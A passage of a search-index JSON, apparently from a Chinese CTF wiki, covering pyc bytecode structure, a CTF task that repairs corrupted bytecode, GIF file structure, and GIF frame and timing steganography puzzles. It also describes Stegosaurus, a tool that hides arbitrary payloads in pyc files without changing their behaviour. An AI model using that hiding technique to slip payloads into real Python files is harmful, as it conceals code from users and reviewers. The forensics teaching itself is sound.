\u4e00\u4e32\u4e8c\u8fdb\u5236\u6d41,\u4ee3\u8868\u7740\u6307\u4ee4\u5e8f\u5217,\u5177\u4f53\u5b9a\u4e49\u5728 include/opcode.h \u4e2d,\u4e5f\u53ef\u4ee5\u53c2\u7167 python opcodes \u3002 \u7531 \u6307\u4ee4(opcode),\u5206\u4e3a\u6709\u53c2\u6570\u548c\u65e0\u53c2\u6570\u4e24\u79cd,\u4ee5 https://github.com/python/cpython/blob/fc7df0e664198cb05cafd972f190a18ca422989c/Include/opcode.h#L69 \u5212\u5206 \u53c2\u6570(oparg) python3.6 \u4ee5\u4e0a\u53c2\u6570\u6c38\u8fdc\u53601\u5b57\u8282,\u5982\u679c\u6307\u4ee4\u4e0d\u5e26\u53c2\u6570\u7684\u8bdd\u5219\u4ee5 0x00 \u4ee3\u66ff,\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u88ab\u89e3\u91ca\u5668\u5ffd\u7565,\u4e5f\u662f Stegosaurus \u6280\u672f\u539f\u7406;\u800c\u4f4e\u4e8epython3.5\u7684\u7248\u672c\u4e2d\u6307\u4ee4\u4e0d\u5e26\u53c2\u6570\u7684\u8bdd\u5374\u6ca1\u6709 0x00 \u586b\u5145 \u4f8b\u9898 \u00b6 Hackover CTF 2016 : img-enc \u9996\u5148\u5c1d\u8bd5pycdc\u53cd\u7f16\u8bd1\u5931\u8d25 # Source Generated with Decompyle++ # File: imgenc.pyc (Python 2.7) import sys import numpy as np from scipy.misc import imread , imsave def doit ( input_file , output_file , f ): Unsupported opcode : STOP_CODE img = imread ( input_file , flatten = True ) img /= 255 size = img . shape [ 0 ] # WARNING: Decompyle incomplete \u6ce8\u610f\u5230\u662fpython2.7,\u4e5f\u5c31\u662f\u8bf4\u6307\u4ee4\u5e8f\u5217\u5171\u53601\u5b57\u8282\u62163\u5b57\u8282(\u6709\u53c2\u6570\u65e0\u53c2\u6570) \u4f7f\u7528pcads\u5f97\u5230 imgenc.pyc (Python 2.7) ... 67 STOP_CODE 68 STOP_CODE 69 BINARY_DIVIDE 70 JUMP_IF_TRUE_OR_POP 5 73 LOAD_CONST 3: 0 76 LOAD_CONST 3: 0 79 BINARY_DIVIDE \u5b9a\u4f4d\u5230\u51fa\u9519\u7684\u5730\u65b9,\u89c2\u5bdf\u53d1\u73b0 LOAD_CONST LOAD_CONST BINARY_DIVIDE STORE_FAST opcodes (64 03 00 64 03 00 15 7d 05 00) \u88ab\u7834\u574f\u4e86,\u6839\u636e\u4e0a\u4e0b\u6587\u7ebf\u7d22\u4fee\u590d\u540e 00000120 64 04 00 6b 00 00 72 ce 00 64 03 00 64 03 00 15 |d..k..r..d..d...| 00000130 7d 05 00 64 03 00 64 03 00 15 7d 05 00 64 03 00 |}..d..d...}..d..| 00000140 64 03 00 15 7d 05 00 64 03 00 64 03 00 15 7d 05 |d...}..d..d...}.| 00000150 00 64 03 00 64 03 00 15 7d 05 00 64 03 00 64 03 |.d..d...}..d..d.| 00000160 00 15 7d 05 00 64 03 00 64 03 00 15 7d 05 00 64 |..}..d..d...}..d| 00000170 03 00 64 03 00 15 7d 05 00 64 03 00 64 03 00 15 |..d...}..d..d...| 00000180 7d 05 00 64 03 00 64 03 00 15 7d 05 00 64 03 00 |}..d..d...}..d..| 00000190 64 03 00 15 7d 05 00 64 03 00 64 03 00 15 7d 05 |d...}..d..d...}.| 000001a0 00 64 03 00 64 03 00 15 7d 05 00 64 03 00 64 03 |.d..d...}..d..d.| 000001b0 00 15 7d 05 00 64 03 00 64 03 00 15 7d 05 00 6e |..}..d..d...}..n| \u63a5\u4e0b\u6765\u6839\u636e\u4fee\u590d\u597d\u7684python\u6e90\u4ee3\u7801\u5f97\u5230flag\u5373\u53ef \u5ef6\u4f38 : \u9898\u76ee: 0ctf-2017:py writeup: \u8bb0\u4e00\u6b21\u624b\u64b8CPython bytecode Tools \u00b6 pycdc \u00b6 \u5c06python\u5b57\u8282\u7801\u8f6c\u6362\u4e3a\u53ef\u8bfb\u7684python \u6e90\u4ee3\u7801,\u5305\u542b\u4e86\u53cd\u6c47\u7f16(pycads)\u548c\u53cd\u7f16\u8bd1(pycdc)\u4e24\u79cd\u5de5\u5177 Stegosaurus \u00b6 \u5141\u8bb8\u6211\u4eec\u5728Python\u5b57\u8282\u7801\u6587\u4ef6\uff08pyc\u6216pyo\uff09\u4e2d\u5d4c\u5165\u4efb\u610fPayload\u3002\u7531\u4e8e\u7f16\u7801\u5bc6\u5ea6\u8f83\u4f4e\uff0c\u56e0\u6b64\u6211\u4eec\u5d4c\u5165Payload\u7684\u8fc7\u7a0b\u65e2\u4e0d\u4f1a\u6539\u53d8\u6e90\u4ee3\u7801\u7684\u8fd0\u884c\u884c\u4e3a\uff0c\u4e5f\u4e0d\u4f1a\u6539\u53d8\u6e90\u6587\u4ef6\u7684\u6587\u4ef6\u5927\u5c0f \u539f\u7406\u662f\u5728python\u7684\u5b57\u8282\u7801\u6587\u4ef6\u4e2d,\u5229\u7528\u5197\u4f59\u7a7a\u95f4,\u5c06\u5b8c\u6574\u7684payload\u4ee3\u7801\u5206\u6563\u9690\u85cf\u5230\u8fd9\u4e9b\u96f6\u96f6\u788e\u788e\u7684\u7a7a\u95f4\u4e2d. Ref : \u4e00\u79cd\u7528\u4e8e\u5728Python\u5b57\u8282\u7801\u4e2d\u5d4c\u5165Payload\u7684\u9690\u5199\u5de5\u5177 \u2013 Stegosaurus Challenges : WHCTF-2017:Py-Py-Py","title":"pyc\u6587\u4ef6"},{"location":"misc/other/pyc/#code-object","text":"\u5728\u6211\u4eec\u5bfc\u5165 python \u811a\u672c\u65f6\u5728\u76ee\u5f55\u4e0b\u4f1a\u751f\u6210\u4e2a\u4e00\u4e2a\u76f8\u5e94\u7684 pyc \u6587\u4ef6\uff0c\u662fpythoncodeobj\u7684\u6301\u4e45\u5316\u50a8\u5b58\u5f62\u5f0f,\u52a0\u901f\u4e0b\u4e00\u6b21\u7684\u88c5\u8f7d\u3002","title":"code object"},{"location":"misc/other/pyc/#_1","text":"pyc\u6587\u4ef6\u7531\u4e09\u5927\u90e8\u5206\u7ec4\u6210 \u6700\u5f00\u59cb4\u4e2a\u5b57\u8282\u662f\u4e00\u4e2aMaigc int, \u6807\u8bc6\u6b64pyc\u7684\u7248\u672c\u4fe1\u606f \u63a5\u4e0b\u6765\u56db\u4e2a\u5b57\u8282\u8fd8\u662f\u4e2aint,\u662fpyc\u4ea7\u751f\u7684\u65f6\u95f4 \u5e8f\u5217\u5316\u7684 PyCodeObject,\u7ed3\u6784\u53c2\u7167 include/code.h ,\u5e8f\u5217\u5316\u65b9\u6cd5 python/marshal pyc\u5b8c\u6574\u7684\u6587\u4ef6\u89e3\u6790\u53ef\u4ee5\u53c2\u7167 Python\u7a0b\u5e8f\u7684\u6267\u884c\u539f\u7406 PYC\u6587\u4ef6\u683c\u5f0f\u5206\u6790 \u5173\u4e8eco_code \u4e00\u4e32\u4e8c\u8fdb\u5236\u6d41,\u4ee3\u8868\u7740\u6307\u4ee4\u5e8f\u5217,\u5177\u4f53\u5b9a\u4e49\u5728 include/opcode.h \u4e2d,\u4e5f\u53ef\u4ee5\u53c2\u7167 python opcodes \u3002 \u7531 \u6307\u4ee4(opcode),\u5206\u4e3a\u6709\u53c2\u6570\u548c\u65e0\u53c2\u6570\u4e24\u79cd,\u4ee5 https://github.com/python/cpython/blob/fc7df0e664198cb05cafd972f190a18ca422989c/Include/opcode.h#L69 \u5212\u5206 \u53c2\u6570(oparg) python3.6 \u4ee5\u4e0a\u53c2\u6570\u6c38\u8fdc\u53601\u5b57\u8282,\u5982\u679c\u6307\u4ee4\u4e0d\u5e26\u53c2\u6570\u7684\u8bdd\u5219\u4ee5 0x00 \u4ee3\u66ff,\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u88ab\u89e3\u91ca\u5668\u5ffd\u7565,\u4e5f\u662f Stegosaurus \u6280\u672f\u539f\u7406;\u800c\u4f4e\u4e8epython3.5\u7684\u7248\u672c\u4e2d\u6307\u4ee4\u4e0d\u5e26\u53c2\u6570\u7684\u8bdd\u5374\u6ca1\u6709 0x00 \u586b\u5145","title":"\u6587\u4ef6\u7ed3\u6784"},{"location":"misc/other/pyc/#_2","text":"Hackover CTF 2016 : img-enc \u9996\u5148\u5c1d\u8bd5pycdc\u53cd\u7f16\u8bd1\u5931\u8d25 # Source Generated with Decompyle++ # File: imgenc.pyc (Python 2.7) import sys import numpy as np from scipy.misc import imread , imsave def doit ( input_file , output_file , f ): Unsupported opcode : STOP_CODE img = imread ( input_file , flatten = True ) img /= 255 size = img . shape [ 0 ] # WARNING: Decompyle incomplete \u6ce8\u610f\u5230\u662fpython2.7,\u4e5f\u5c31\u662f\u8bf4\u6307\u4ee4\u5e8f\u5217\u5171\u53601\u5b57\u8282\u62163\u5b57\u8282(\u6709\u53c2\u6570\u65e0\u53c2\u6570) \u4f7f\u7528pcads\u5f97\u5230 imgenc.pyc (Python 2.7) ... 67 STOP_CODE 68 STOP_CODE 69 BINARY_DIVIDE 70 JUMP_IF_TRUE_OR_POP 5 73 LOAD_CONST 3: 0 76 LOAD_CONST 3: 0 79 BINARY_DIVIDE \u5b9a\u4f4d\u5230\u51fa\u9519\u7684\u5730\u65b9,\u89c2\u5bdf\u53d1\u73b0 LOAD_CONST LOAD_CONST BINARY_DIVIDE STORE_FAST opcodes (64 03 00 64 03 00 15 7d 05 00) \u88ab\u7834\u574f\u4e86,\u6839\u636e\u4e0a\u4e0b\u6587\u7ebf\u7d22\u4fee\u590d\u540e 00000120 64 04 00 6b 00 00 72 ce 00 64 03 00 64 03 00 15 |d..k..r..d..d...| 00000130 7d 05 00 64 03 00 64 03 00 15 7d 05 00 64 03 00 |}..d..d...}..d..| 00000140 64 03 00 15 7d 05 00 64 03 00 64 03 00 15 7d 05 |d...}..d..d...}.| 00000150 00 64 03 00 64 03 00 15 7d 05 00 64 03 00 64 03 |.d..d...}..d..d.| 00000160 00 15 7d 05 00 64 03 00 64 03 00 15 7d 05 00 64 |..}..d..d...}..d| 00000170 03 00 64 03 00 15 7d 05 00 64 03 00 64 03 00 15 |..d...}..d..d...| 00000180 7d 05 00 64 03 00 64 03 00 15 7d 05 00 64 03 00 |}..d..d...}..d..| 00000190 64 03 00 15 7d 05 00 64 03 00 64 03 00 15 7d 05 |d...}..d..d...}.| 000001a0 00 64 03 00 64 03 00 15 7d 05 00 64 03 00 64 03 |.d..d...}..d..d.| 000001b0 00 15 7d 05 00 64 03 00 64 03 00 15 7d 05 00 6e |..}..d..d...}..n| \u63a5\u4e0b\u6765\u6839\u636e\u4fee\u590d\u597d\u7684python\u6e90\u4ee3\u7801\u5f97\u5230flag\u5373\u53ef \u5ef6\u4f38 : \u9898\u76ee: 0ctf-2017:py writeup: \u8bb0\u4e00\u6b21\u624b\u64b8CPython bytecode","title":"\u4f8b\u9898"},{"location":"misc/other/pyc/#tools","text":"","title":"Tools"},{"location":"misc/other/pyc/#pycdc","text":"\u5c06python\u5b57\u8282\u7801\u8f6c\u6362\u4e3a\u53ef\u8bfb\u7684python \u6e90\u4ee3\u7801,\u5305\u542b\u4e86\u53cd\u6c47\u7f16(pycads)\u548c\u53cd\u7f16\u8bd1(pycdc)\u4e24\u79cd\u5de5\u5177","title":"pycdc"},{"location":"misc/other/pyc/#stegosaurus","text":"\u5141\u8bb8\u6211\u4eec\u5728Python\u5b57\u8282\u7801\u6587\u4ef6\uff08pyc\u6216pyo\uff09\u4e2d\u5d4c\u5165\u4efb\u610fPayload\u3002\u7531\u4e8e\u7f16\u7801\u5bc6\u5ea6\u8f83\u4f4e\uff0c\u56e0\u6b64\u6211\u4eec\u5d4c\u5165Payload\u7684\u8fc7\u7a0b\u65e2\u4e0d\u4f1a\u6539\u53d8\u6e90\u4ee3\u7801\u7684\u8fd0\u884c\u884c\u4e3a\uff0c\u4e5f\u4e0d\u4f1a\u6539\u53d8\u6e90\u6587\u4ef6\u7684\u6587\u4ef6\u5927\u5c0f \u539f\u7406\u662f\u5728python\u7684\u5b57\u8282\u7801\u6587\u4ef6\u4e2d,\u5229\u7528\u5197\u4f59\u7a7a\u95f4,\u5c06\u5b8c\u6574\u7684payload\u4ee3\u7801\u5206\u6563\u9690\u85cf\u5230\u8fd9\u4e9b\u96f6\u96f6\u788e\u788e\u7684\u7a7a\u95f4\u4e2d. Ref : \u4e00\u79cd\u7528\u4e8e\u5728Python\u5b57\u8282\u7801\u4e2d\u5d4c\u5165Payload\u7684\u9690\u5199\u5de5\u5177 \u2013 Stegosaurus Challenges : WHCTF-2017:Py-Py-Py","title":"Stegosaurus"},{"location":"misc/picture/gif/","text":"\u6587\u4ef6\u7ed3\u6784 \u00b6 \u4e00\u4e2aGIF\u6587\u4ef6\u7684\u7ed3\u6784\u53ef\u5206\u4e3a \u6587\u4ef6\u5934\uff08File Header\uff09 GIF \u6587\u4ef6\u7f72\u540d\uff08Signature\uff09 \u7248\u672c\u53f7\uff08Version\uff09 GIF \u6570\u636e\u6d41\uff08GIF Data Stream\uff09 \u63a7\u5236\u6807\u8bc6\u7b26 \u56fe\u8c61\u5757\uff08Image Block\uff09 \u5176\u4ed6\u7684\u4e00\u4e9b\u6269\u5c55\u5757 \u6587\u4ef6\u7ec8\u7ed3\u5668\uff08Trailer\uff09 \u4e0b\u8868\u663e\u793a\u4e86\u4e00\u4e2a GIF \u6587\u4ef6\u7684\u7ec4\u6210\u7ed3\u6784\uff1a \u4e2d\u95f4\u7684\u90a3\u4e2a\u5927\u5757\u53ef\u4ee5\u88ab\u91cd\u590d\u4efb\u610f\u6b21 \u6587\u4ef6\u5934 \u00b6 GIF \u7f72\u540d\uff08Signature\uff09\u548c\u7248\u672c\u53f7\uff08Version\uff09\u3002GIF \u7f72\u540d\u7528\u6765\u786e\u8ba4\u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u662f GIF \u683c\u5f0f\u7684\u6587\u4ef6\uff0c\u8fd9\u4e00\u90e8\u5206\u7531\u4e09\u4e2a\u5b57\u7b26\u7ec4\u6210\uff1a GIF \uff1b\u6587\u4ef6\u7248\u672c\u53f7\u4e5f\u662f\u7531\u4e09\u4e2a\u5b57\u8282\u7ec4\u6210\uff0c\u53ef\u4ee5\u4e3a 87a \u6216 89a \u3002 \u903b\u8f91\u5c4f\u5e55\u6807\u8bc6\u7b26\uff08Logical Screen Descriptor\uff09 \u00b6 Logical Screen Descriptor\uff08\u903b\u8f91\u5c4f\u5e55\u63cf\u8ff0\u7b26\uff09\u7d27\u8ddf\u5728 header \u540e\u9762\u3002\u8fd9\u4e2a\u5757\u544a\u8bc9 decoder\uff08\u89e3\u7801\u5668\uff09\u56fe\u7247\u9700\u8981\u5360\u7528\u7684\u7a7a\u95f4\u3002\u5b83\u7684\u5927\u5c0f\u56fa\u5b9a\u4e3a 7 \u4e2a\u5b57\u8282\uff0c\u4ee5 canvas width\uff08\u753b\u5e03\u5bbd\u5ea6\uff09\u548c canvas height\uff08\u753b\u5e03\u9ad8\u5ea6\uff09\u5f00\u59cb\u3002 \u5168\u5c40\u989c\u8272\u5217\u8868\uff08Global Color Table\uff09 \u00b6 GIF\u683c\u5f0f\u53ef\u4ee5\u62e5\u6709global color table\uff0c\u6216\u7528\u4e8e\u9488\u5bf9\u6bcf\u4e2a\u5b50\u56fe\u7247\u96c6\uff0c\u63d0\u4f9blocal color table\u3002\u6bcf\u4e2acolor table\u7531\u4e00\u4e2aRGB\uff08\u5c31\u50cf\u901a\u5e38\u6211\u4eec\u89c1\u5230\u7684\uff08255\uff0c0\uff0c0\uff09\u7ea2\u8272 \u90a3\u79cd\uff09\u5217\u8868\u7ec4\u6210\u3002 \u56fe\u50cf\u6807\u8bc6\u7b26\uff08Image Descriptor\uff09 \u00b6 \u4e00\u4e2a GIF \u6587\u4ef6\u4e00\u822c\u5305\u542b\u591a\u4e2a\u56fe\u7247\u3002\u4e4b\u524d\u7684\u56fe\u7247\u6e32\u67d3\u6a21\u5f0f\u4e00\u822c\u662f\u5c06\u591a\u4e2a\u56fe\u7247\u7ed8\u5236\u5230\u4e00\u4e2a\u5927\u7684\uff08virtual canvas\uff09\u865a\u62df\u753b\u5e03\u4e0a\uff0c\u800c\u73b0\u5728\u4e00\u822c\u5c06\u8fd9\u4e9b\u56fe\u7247\u96c6\u7528\u4e8e\u5b9e\u73b0\u52a8\u753b\u3002 \u6bcf\u4e2a image \u90fd\u4ee5\u4e00\u4e2a image descriptor block\uff08\u56fe\u50cf\u63cf\u8ff0\u5757\uff09\u4f5c\u4e3a\u5f00\u5934\uff0c\u8fd9\u4e2a\u5757\u56fa\u5b9a\u4e3a 10 \u5b57\u8282\u3002 \u56fe\u50cf\u6570\u636e\uff08Image Data\uff09 \u00b6 \u7ec8\u4e8e\u5230\u4e86\u56fe\u7247\u6570\u636e\u5b9e\u9645\u5b58\u50a8\u7684\u5730\u65b9\u3002Image Data\u662f\u7531\u4e00\u7cfb\u5217\u7684\u8f93\u51fa\u7f16\u7801\uff08output codes\uff09\u6784\u6210\uff0c\u5b83\u4eec\u544a\u8bc9decoder\uff08\u89e3\u7801\u5668\uff09\u9700\u8981\u7ed8\u5236\u5728\u753b\u5e03\u4e0a\u7684\u6bcf\u4e2a\u989c\u8272\u4fe1\u606f\u3002\u8fd9\u4e9b\u7f16\u7801\u4ee5\u5b57\u8282\u7801\u7684\u5f62\u5f0f\u7ec4\u7ec7\u5728\u8fd9\u4e2a\u5757\u4e2d\u3002 \u6587\u4ef6\u7ec8\u7ed3\u5668\uff08Trailer\uff09 \u00b6 \u8be5\u5757\u4e3a\u4e00\u4e2a\u5355\u5b57\u6bb5\u5757\uff0c\u7528\u6765\u6307\u793a\u8be5\u6570\u636e\u6d41\u7684\u7ed3\u675f\u3002\u53d6\u56fa\u5b9a\u503c0x3b. \u66f4\u591a\u53c2\u89c1 gif \u683c\u5f0f\u56fe\u7247\u8be6\u7ec6\u89e3\u6790 \u7a7a\u95f4\u8f74 \u00b6 \u7531\u4e8eGIF\u7684\u52a8\u6001\u7279\u6027\uff0c\u7531\u4e00\u5e27\u5e27\u7684\u56fe\u7247\u6784\u6210\uff0c\u6240\u4ee5\u6bcf\u4e00\u5e27\u7684\u56fe\u7247\uff0c\u591a\u5e27\u56fe\u7247\u95f4\u7684\u7ed3\u5408\uff0c\u90fd\u6210\u4e86\u9690\u85cf\u4fe1\u606f\u7684\u4e00\u79cd\u8f7d\u4f53\u3002 \u5bf9\u4e8e\u9700\u8981\u5206\u79bb\u7684GIF\u6587\u4ef6,\u53ef\u4ee5\u4f7f\u7528 convert \u547d\u4ee4\u5c06\u5176\u6bcf\u4e00\u5e27\u5206\u5272\u5f00\u6765 ``` sourceCode shell root in ~/Desktop/tmp \u03bb convert cake.gif cake.png root in ~/Desktop/tmp \u03bb ls cake-0.png cake-1.png cake-2.png cake-3.png cake.gif ### \u4f8b\u9898 > WDCTF-2017:3-2 \u6253\u5f00gif\u540e\uff0c\u601d\u8def\u5f88\u6e05\u6670\uff0c\u5206\u79bb\u6bcf\u4e00\u5e27\u56fe\u7247\u540e\uff0c\u5c06\u8d77\u5408\u5e76\u5f97\u5230\u5b8c\u6574\u7684\u4e8c\u7ef4\u7801\u5373\u53ef ``` sourceCode python from PIL import Image flag = Image.new(\"RGB\",(450,450)) for i in range(2): for j in range(2): pot = \"cake-{}.png\".format(j+i*2) potImage = Image.open(pot) flag.paste(potImage,(j*225,i*225)) flag.save('./flag.png') \u626b\u7801\u540e\u5f97\u5230\u4e00\u4e3216\u8fdb\u5236\u5b57\u7b26\u4e32 03f30d0ab8c1aa5....74080006030908 \u5f00\u5934 03f3 \u4e3a pyc \u6587\u4ef6\u7684\u5934\uff0c\u6062\u590d\u4e3a python \u811a\u672c\u540e\u76f4\u63a5\u8fd0\u884c\u5f97\u5230flag \u65f6\u95f4\u8f74 \u00b6 GIF\u6587\u4ef6\u6bcf\u4e00\u5e27\u95f4\u7684\u65f6\u95f4\u95f4\u9694\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u4fe1\u606f\u9690\u85cf\u7684\u8f7d\u4f53\u3002 \u4f8b\u5982\u5728\u5f53\u65f6\u5728XMan\u9009\u62d4\u8d5b\u51fa\u7684\u4e00\u9898 XMAN-2017:100.gif \u901a\u8fc7 identify \u547d\u4ee4\u6e05\u6670\u7684\u6253\u5370\u51fa\u6bcf\u4e00\u5e27\u7684\u65f6\u95f4\u95f4\u9694 $ identify -format \"%s %T \\n\" 100 .gif 0 66 1 66 2 20 3 10 4 20 5 10 6 10 7 20 8 20 9 20 10 20 11 10 12 20 13 20 14 10 15 10 \u63a8\u65ad 20 & 10 \u5206\u522b\u4ee3\u8868 0 & 1 \uff0c\u63d0\u53d6\u6bcf\u4e00\u5e27\u95f4\u9694\u5e76\u8fdb\u884c\u8f6c\u5316\u3002 $ cat flag | cut -d ' ' -f 2 | tr -d '66' | tr -d '\\n' | tr -d '0' | tr '2' '0' 0101100001001101010000010100111001111011001110010011011000110101001101110011010101100010011001010110010101100100001101000110010001100101011000010011000100111000011001000110010101100100001101000011011100110011001101010011011000110100001100110110000101100101011000110110011001100001001100110011010101111101 # \u6700\u540e\u8f6c ASCII \u7801\u5f97\u5230 flag\u3002 \u9690\u5199\u8f6f\u4ef6 \u00b6 F5-steganography","title":"GIF"},{"location":"misc/picture/gif/#_1","text":"\u4e00\u4e2aGIF\u6587\u4ef6\u7684\u7ed3\u6784\u53ef\u5206\u4e3a \u6587\u4ef6\u5934\uff08File Header\uff09 GIF \u6587\u4ef6\u7f72\u540d\uff08Signature\uff09 \u7248\u672c\u53f7\uff08Version\uff09 GIF \u6570\u636e\u6d41\uff08GIF Data Stream\uff09 \u63a7\u5236\u6807\u8bc6\u7b26 \u56fe\u8c61\u5757\uff08Image Block\uff09 \u5176\u4ed6\u7684\u4e00\u4e9b\u6269\u5c55\u5757 \u6587\u4ef6\u7ec8\u7ed3\u5668\uff08Trailer\uff09 \u4e0b\u8868\u663e\u793a\u4e86\u4e00\u4e2a GIF \u6587\u4ef6\u7684\u7ec4\u6210\u7ed3\u6784\uff1a \u4e2d\u95f4\u7684\u90a3\u4e2a\u5927\u5757\u53ef\u4ee5\u88ab\u91cd\u590d\u4efb\u610f\u6b21","title":"\u6587\u4ef6\u7ed3\u6784"},{"location":"misc/picture/gif/#_2","text":"GIF \u7f72\u540d\uff08Signature\uff09\u548c\u7248\u672c\u53f7\uff08Version\uff09\u3002GIF \u7f72\u540d\u7528\u6765\u786e\u8ba4\u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u662f GIF \u683c\u5f0f\u7684\u6587\u4ef6\uff0c\u8fd9\u4e00\u90e8\u5206\u7531\u4e09\u4e2a\u5b57\u7b26\u7ec4\u6210\uff1a GIF \uff1b\u6587\u4ef6\u7248\u672c\u53f7\u4e5f\u662f\u7531\u4e09\u4e2a\u5b57\u8282\u7ec4\u6210\uff0c\u53ef\u4ee5\u4e3a 87a \u6216 89a \u3002","title":"\u6587\u4ef6\u5934"},{"location":"misc/picture/gif/#logical-screen-descriptor","text":"Logical Screen Descriptor\uff08\u903b\u8f91\u5c4f\u5e55\u63cf\u8ff0\u7b26\uff09\u7d27\u8ddf\u5728 header \u540e\u9762\u3002\u8fd9\u4e2a\u5757\u544a\u8bc9 decoder\uff08\u89e3\u7801\u5668\uff09\u56fe\u7247\u9700\u8981\u5360\u7528\u7684\u7a7a\u95f4\u3002\u5b83\u7684\u5927\u5c0f\u56fa\u5b9a\u4e3a 7 \u4e2a\u5b57\u8282\uff0c\u4ee5 canvas width\uff08\u753b\u5e03\u5bbd\u5ea6\uff09\u548c canvas height\uff08\u753b\u5e03\u9ad8\u5ea6\uff09\u5f00\u59cb\u3002","title":"\u903b\u8f91\u5c4f\u5e55\u6807\u8bc6\u7b26\uff08Logical Screen Descriptor\uff09"},{"location":"misc/picture/gif/#global-color-table","text":"GIF\u683c\u5f0f\u53ef\u4ee5\u62e5\u6709global color table\uff0c\u6216\u7528\u4e8e\u9488\u5bf9\u6bcf\u4e2a\u5b50\u56fe\u7247\u96c6\uff0c\u63d0\u4f9blocal color table\u3002\u6bcf\u4e2acolor table\u7531\u4e00\u4e2aRGB\uff08\u5c31\u50cf\u901a\u5e38\u6211\u4eec\u89c1\u5230\u7684\uff08255\uff0c0\uff0c0\uff09\u7ea2\u8272 \u90a3\u79cd\uff09\u5217\u8868\u7ec4\u6210\u3002","title":"\u5168\u5c40\u989c\u8272\u5217\u8868\uff08Global Color Table\uff09"},{"location":"misc/picture/gif/#image-descriptor","text":"\u4e00\u4e2a GIF \u6587\u4ef6\u4e00\u822c\u5305\u542b\u591a\u4e2a\u56fe\u7247\u3002\u4e4b\u524d\u7684\u56fe\u7247\u6e32\u67d3\u6a21\u5f0f\u4e00\u822c\u662f\u5c06\u591a\u4e2a\u56fe\u7247\u7ed8\u5236\u5230\u4e00\u4e2a\u5927\u7684\uff08virtual canvas\uff09\u865a\u62df\u753b\u5e03\u4e0a\uff0c\u800c\u73b0\u5728\u4e00\u822c\u5c06\u8fd9\u4e9b\u56fe\u7247\u96c6\u7528\u4e8e\u5b9e\u73b0\u52a8\u753b\u3002 \u6bcf\u4e2a image \u90fd\u4ee5\u4e00\u4e2a image descriptor block\uff08\u56fe\u50cf\u63cf\u8ff0\u5757\uff09\u4f5c\u4e3a\u5f00\u5934\uff0c\u8fd9\u4e2a\u5757\u56fa\u5b9a\u4e3a 10 \u5b57\u8282\u3002","title":"\u56fe\u50cf\u6807\u8bc6\u7b26\uff08Image Descriptor\uff09"},{"location":"misc/picture/gif/#image-data","text":"\u7ec8\u4e8e\u5230\u4e86\u56fe\u7247\u6570\u636e\u5b9e\u9645\u5b58\u50a8\u7684\u5730\u65b9\u3002Image Data\u662f\u7531\u4e00\u7cfb\u5217\u7684\u8f93\u51fa\u7f16\u7801\uff08output codes\uff09\u6784\u6210\uff0c\u5b83\u4eec\u544a\u8bc9decoder\uff08\u89e3\u7801\u5668\uff09\u9700\u8981\u7ed8\u5236\u5728\u753b\u5e03\u4e0a\u7684\u6bcf\u4e2a\u989c\u8272\u4fe1\u606f\u3002\u8fd9\u4e9b\u7f16\u7801\u4ee5\u5b57\u8282\u7801\u7684\u5f62\u5f0f\u7ec4\u7ec7\u5728\u8fd9\u4e2a\u5757\u4e2d\u3002","title":"\u56fe\u50cf\u6570\u636e\uff08Image Data\uff09"},{"location":"misc/picture/gif/#trailer","text":"\u8be5\u5757\u4e3a\u4e00\u4e2a\u5355\u5b57\u6bb5\u5757\uff0c\u7528\u6765\u6307\u793a\u8be5\u6570\u636e\u6d41\u7684\u7ed3\u675f\u3002\u53d6\u56fa\u5b9a\u503c0x3b. \u66f4\u591a\u53c2\u89c1 gif \u683c\u5f0f\u56fe\u7247\u8be6\u7ec6\u89e3\u6790","title":"\u6587\u4ef6\u7ec8\u7ed3\u5668\uff08Trailer\uff09"},{"location":"misc/picture/gif/#_3","text":"\u7531\u4e8eGIF\u7684\u52a8\u6001\u7279\u6027\uff0c\u7531\u4e00\u5e27\u5e27\u7684\u56fe\u7247\u6784\u6210\uff0c\u6240\u4ee5\u6bcf\u4e00\u5e27\u7684\u56fe\u7247\uff0c\u591a\u5e27\u56fe\u7247\u95f4\u7684\u7ed3\u5408\uff0c\u90fd\u6210\u4e86\u9690\u85cf\u4fe1\u606f\u7684\u4e00\u79cd\u8f7d\u4f53\u3002 \u5bf9\u4e8e\u9700\u8981\u5206\u79bb\u7684GIF\u6587\u4ef6,\u53ef\u4ee5\u4f7f\u7528 convert \u547d\u4ee4\u5c06\u5176\u6bcf\u4e00\u5e27\u5206\u5272\u5f00\u6765 ``` sourceCode shell root in ~/Desktop/tmp \u03bb convert cake.gif cake.png root in ~/Desktop/tmp \u03bb ls cake-0.png cake-1.png cake-2.png cake-3.png cake.gif ### \u4f8b\u9898 > WDCTF-2017:3-2 \u6253\u5f00gif\u540e\uff0c\u601d\u8def\u5f88\u6e05\u6670\uff0c\u5206\u79bb\u6bcf\u4e00\u5e27\u56fe\u7247\u540e\uff0c\u5c06\u8d77\u5408\u5e76\u5f97\u5230\u5b8c\u6574\u7684\u4e8c\u7ef4\u7801\u5373\u53ef ``` sourceCode python from PIL import Image flag = Image.new(\"RGB\",(450,450)) for i in range(2): for j in range(2): pot = \"cake-{}.png\".format(j+i*2) potImage = Image.open(pot) flag.paste(potImage,(j*225,i*225)) flag.save('./flag.png') \u626b\u7801\u540e\u5f97\u5230\u4e00\u4e3216\u8fdb\u5236\u5b57\u7b26\u4e32 03f30d0ab8c1aa5....74080006030908 \u5f00\u5934 03f3 \u4e3a pyc \u6587\u4ef6\u7684\u5934\uff0c\u6062\u590d\u4e3a python \u811a\u672c\u540e\u76f4\u63a5\u8fd0\u884c\u5f97\u5230flag","title":"\u7a7a\u95f4\u8f74"},{"location":"misc/picture/gif/#_4","text":"GIF\u6587\u4ef6\u6bcf\u4e00\u5e27\u95f4\u7684\u65f6\u95f4\u95f4\u9694\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u4fe1\u606f\u9690\u85cf\u7684\u8f7d\u4f53\u3002 \u4f8b\u5982\u5728\u5f53\u65f6\u5728XMan\u9009\u62d4\u8d5b\u51fa\u7684\u4e00\u9898 XMAN-2017:100.gif \u901a\u8fc7 identify \u547d\u4ee4\u6e05\u6670\u7684\u6253\u5370\u51fa\u6bcf\u4e00\u5e27\u7684\u65f6\u95f4\u95f4\u9694 $ identify -format \"%s %T \\n\" 100 .gif 0 66 1 66 2 20 3 10 4 20 5 10 6 10 7 20 8 20 9 20 10 20 11 10 12 20 13 20 14 10 15 10 \u63a8\u65ad 20 & 10 \u5206\u522b\u4ee3\u8868 0 & 1 